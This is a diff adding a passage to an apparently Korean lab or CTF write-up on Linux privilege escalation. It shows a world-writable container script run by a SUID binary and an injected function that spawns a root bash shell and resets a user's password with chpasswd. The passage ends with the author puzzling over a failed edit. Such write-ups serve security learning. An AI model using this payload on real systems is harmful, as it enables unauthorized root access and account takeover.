@@ -2519,3 +2519,115 @@ lrwxrwxrwx 1 root root 17 May 9 2023 xtables-monitor -> xtables-nft-multi
   ![](https://velog.velcdn.com/images/agnusdei1207/post/c7479e71-0bfc-4bc0-8fb9-9a43e440ef2c/image.png)
 
 # 둘 다 GTFObins 에 없음 -> 직접 분석 및 공격해야 할 대상
+
+- /opt/run_container.sh
+  ![](https://velog.velcdn.com/images/agnusdei1207/post/3df4dea1-7cdd-4e76-9a7b-179ffab8313c/image.png)
+
+> Interesting writable files owned by me or writable by everyone
+
+think@ip-10-201-11-134:/dev/shm$ cat /opt/run_container.sh
+
+```bash
+#!/bin/bash
+
+# Function to list Docker containers
+
+list_containers() {
+if [ -z "$(docker ps -aq)" ]; then
+docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
+fi
+echo "List of Docker containers:"
+docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
+echo ""
+}
+
+# Function to prompt user for container ID
+
+prompt_container_id() {
+read -p "Enter the ID of the container or leave blank to create a new one: " container_id
+validate_container_id "$container_id"
+}
+
+# Function to display options and perform actions
+
+select_action() {
+echo ""
+echo "OPTIONS:"
+local container_id="$1"
+PS3="Choose an action for a container: "
+options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")
+
+    select opt in "${options[@]}"; do
+        case $REPLY in
+            1) docker start "$container_id"; break ;;
+            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
+             echo "No enough containers are currently running."
+                  exit 1
+    fi
+                docker stop "$container_id"
+                break ;;
+            3) docker restart "$container_id"; break ;;
+            4) echo "Creating a new container..."
+               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest
+               break ;;
+            5) echo "Exiting..."; exit ;;
+            *) echo "Invalid option. Please choose a valid option." ;;
+        esac
+    done
+
+}
+
+# Main script execution
+
+list_containers
+prompt_container_id # Get the container ID from prompt_container_id function
+select_action "$container_id"  # Pass the container ID to select_action function
+think@ip-10-201-11-134:/dev/shm$
+```
+
+> /opt/run_container.sh 파일이 모두 쓰기 가능(-rwxrwxrwx)이므로, 아무나 내용을 수정할 수 있습니다.
+> /usr/sbin/run_container 바이너리가 SUID/SGID로 실행되면, 이 스크립트가 root 권한으로 실행될 수 있습니다.
+> /usr/sbin/run_container 바이너리가 SUID/SGID로 설정되어 있고,
+> 이 바이너리가 /opt/run_container.sh 스크립트를 실행하는데,
+> /opt/run_container.sh가 모두 쓰기 가능(-rwxrwxrwx)이면,
+> 스크립트에 bash 실행 코드를 넣고 SUID 바이너리를 실행하면,
+> bash가 root 권한으로 실행되어 root 쉘을 획득할 수 있습니다.
+> 리눅스에서 SUID가 설정된 바이너리(예: /usr/sbin/run_container)를 실행하면,
+> 실행하는 사용자가 누구든 해당 바이너리의 소유자(여기서는 root) 권한으로 동작합니다.
+> 이 바이너리가 /opt/run_container.sh 스크립트를 실행할 때,
+> 스크립트 안에 bash 명령이 있으면,
+> 그 bash 프로세스도 root 권한으로 실행됩니다.
+> SUID/SGID 바이너리 실행 → root 권한 획득
+> 이 바이너리가 모두 쓰기 가능한 스크립트 실행
+> 스크립트에 bash 삽입 → bash가 root로 실행됨
+> root 쉘 획득
+> 이게 바로 OSCP에서 자주 나오는 "SUID 바이너리 + 쓰기 가능한 스크립트" 권한 상승 원리입니다.
+
+# 그렇다면? 메소드 하나 추가해서 권한 상승하기
+
+-rwxr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
+
+```bash
+# 아래 코드 넣고 다른 코드보다 먼저 실행되게 수정
+get_root_shell() {
+    /bin/bash
+    # 비밀번호도 새로 설정
+    echo "think:1234" | chpasswd
+}
+
+get_root_shell
+```
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/76a063b5-25ea-40ae-b997-9854aa9d17d3/image.png)
+
+"/opt/run_container.sh" E509: Cannot create backup file (add ! to override)
+Press ENTER or type command to continue
+![](https://velog.velcdn.com/images/agnusdei1207/post/eba3e680-5af7-456e-bdce-b9b61d09d257/image.png)
+
+# 권한이 있는데 왜 안 되지?
+
+think@ip-10-201-11-134:/dev/shm$ ls -l /opt/run_container.sh
+-rwxrwxrwx 1 root root 1715 Jan 10 2024 /opt/run_container.sh
+think@ip-10-201-11-134:/dev/shm$
+
+sudo ssh -i id_rsa think@10.201.11.134
